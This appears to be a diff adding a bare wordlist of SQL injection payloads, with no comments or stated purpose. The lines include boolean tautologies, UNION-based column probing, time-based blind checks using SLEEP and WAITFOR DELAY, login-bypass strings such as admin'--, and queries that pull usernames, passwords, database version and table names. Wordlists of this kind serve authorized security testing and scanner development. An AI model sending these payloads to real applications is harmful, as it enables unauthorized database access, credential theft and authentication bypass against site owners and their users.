@@ -1,0 +1,32 @@
+' AND 1=1--
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1 AND SLEEP(5)
+1 OR SLEEP(5)
+' WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+'; SELECT * FROM information_schema.tables WHERE 2>1--
+' AND 1=(SELECT COUNT(*) FROM tabnames)--
+1 AND (SELECT * FROM Users)=1
+ORDER BY 1
+ORDER BY 10
+ORDER BY 100
+' AND '1'='1
+') OR ('1'='1
+' OR '1'='1' --
+admin'--
+admin' #
+1' AND non_existent_column=1--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,user()--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+') UNION SELECT NULL,NULL,NULL,NULL-- 
+' OR 1=1 LIMIT 1--
+' AND 1=1 AND '1'='1
